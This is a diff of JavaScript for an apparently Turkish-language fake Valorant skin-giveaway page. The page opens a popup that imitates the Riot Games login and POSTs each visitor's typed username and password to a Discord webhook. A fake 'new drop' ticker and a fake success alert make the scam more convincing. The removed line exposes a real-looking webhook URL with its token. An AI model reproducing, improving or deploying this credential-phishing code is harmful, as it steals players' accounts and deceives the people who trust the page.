@@ -1,25 +1,44 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq"; // Buraya tırnakları bozmadan linki yapıştır
+const WEBHOOK_URL = "SENIN_WEBHOOK_LINKIN";
 
-// Canlı Drop Şeridi
+// Silah Çeşitliliği Arttırıldı
 const dropItems = [
-    {n: "Kuronami Vandal", i: "img/vandal.png"}, // img klasöründeki vandal.png'yi çeker
-    {n: "Reaver Sheriff", i: "img/sheriff.png"},
-    {n: "Prime Phantom", i: "img/phantom.png"},
-    {n: "Elderflame Vandal", i: "img/ejder.png"}
+    {n: "Kuronami Vandal", i: "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png"},
+    {n: "Reaver Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png"},
+    {n: "Prime Phantom", i: "https://static.wikia.nocookie.net/valorant/images/e/e0/Prime_Phantom.png"},
+    {n: "Elderflame Vandal", i: "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"},
+    {n: "Champions Phantom", i: "https://static.wikia.nocookie.net/valorant/images/4/41/Champions_2024_Phantom.png"},
+    {n: "Neo Frontier", i: "https://static.wikia.nocookie.net/valorant/images/d/d0/Neo_Frontier_Sheriff.png"},
+    {n: "Glitchpop Vandal", i: "https://static.wikia.nocookie.net/valorant/images/8/8a/Glitchpop_Vandal.png"},
+    {n: "Singularity Phantom", i: "https://static.wikia.nocookie.net/valorant/images/d/d4/Singularity_Phantom.png"}
 ];
 
 const track = document.getElementById('dropTrack');
-if(track) {
-    for(let i=0; i<40; i++) {
-        let item = dropItems[Math.floor(Math.random()*dropItems.length)];
-        track.innerHTML += `
-            <div class="drop-item">
-                <span>YENİ DROP</span>
-                <img src="${item.i}">
-                <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
-            </div>`;
+
+// Her 2 saniyede bir yeni drop ekleyen fonksiyon
+function addRandomDrop() {
+    const item = dropItems[Math.floor(Math.random() * dropItems.length)];
+    const html = `
+        <div class="drop-item">
+            <span>YENİ DROP</span>
+            <img src="${item.i}">
+            <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
+        </div>
+    `;
+    
+    // Başa ekle
+    track.insertAdjacentHTML('afterbegin', html);
+    
+    // Şerit çok uzamasın diye eski olanları temizle (isteğe bağlı)
+    if(track.children.length > 15) {
+        track.removeChild(track.lastElementChild);
     }
 }
+
+// İlk açılışta birkaç tane ekle
+for(let i=0; i<8; i++) addRandomDrop();
+
+// Her 2 saniyede bir yeni bir tane fırlat
+setInterval(addRandomDrop, 2000);
 
 let loggedIn = false;
 
@@ -27,11 +46,6 @@ function openLogin() {
     const w = 450, h = 600;
     const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
     let win = window.open("", "Riot Login", `width=${w},height=${h},top=${t},left=${l}`);
-
-    if(!win) {
-        alert("Lütfen tarayıcınızın açılır pencerelere (popup) izin verdiğinden emin olun!");
-        return;
-    }
 
     win.document.body.innerHTML = `
         <style>
@@ -43,7 +57,7 @@ function openLogin() {
         </style>
         <div class="wrap">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/2560px-Riot_Games_logo.svg.png">
-            <h2 style="margin-bottom:20px">Giriş Yap</h2>
+            <h2>Giriş Yap</h2>
             <input type="text" id="u" placeholder="Kullanıcı Adı">
             <input type="password" id="p" placeholder="Şifre">
             <button id="b">OTURUM AÇ</button>
@@ -51,27 +65,20 @@ function openLogin() {
     `;
 
     win.document.getElementById('b').onclick = function() {
-        const user = win.document.getElementById('u').value;
-        const pass = win.document.getElementById('p').value;
-        if(user && pass) {
+        const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
+        if(u && p) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `✅ **Yeni Hesap Bilgisi!**\n👤: \`${user}\` \n🔑: \`${pass}\`` })
-            }).catch(err => console.log("Webhook hatası:", err));
-            
-            loggedIn = true;
-            win.close();
+                body: JSON.stringify({ content: `🔥 **Yeni Hesap!**\n👤: \`${u}\` \n🔑: \`${p}\`` })
+            });
+            loggedIn = true; win.close();
             alert("Giriş Başarılı! Ücretsiz kasanızı açabilirsiniz.");
         }
     };
 }
 
 function checkLogin() {
-    if(!loggedIn) {
-        alert("Ödül kazanmak için önce Riot hesabınızla giriş yapmalısınız.");
-        openLogin();
-    } else {
-        alert("Kasa açılıyor... Lütfen bekleyin.");
-    }
+    if(!loggedIn) { alert("Önce giriş yapmalısınız!"); openLogin(); }
+    else { alert("Kasa açılıyor... Lütfen bekleyin."); }
 }
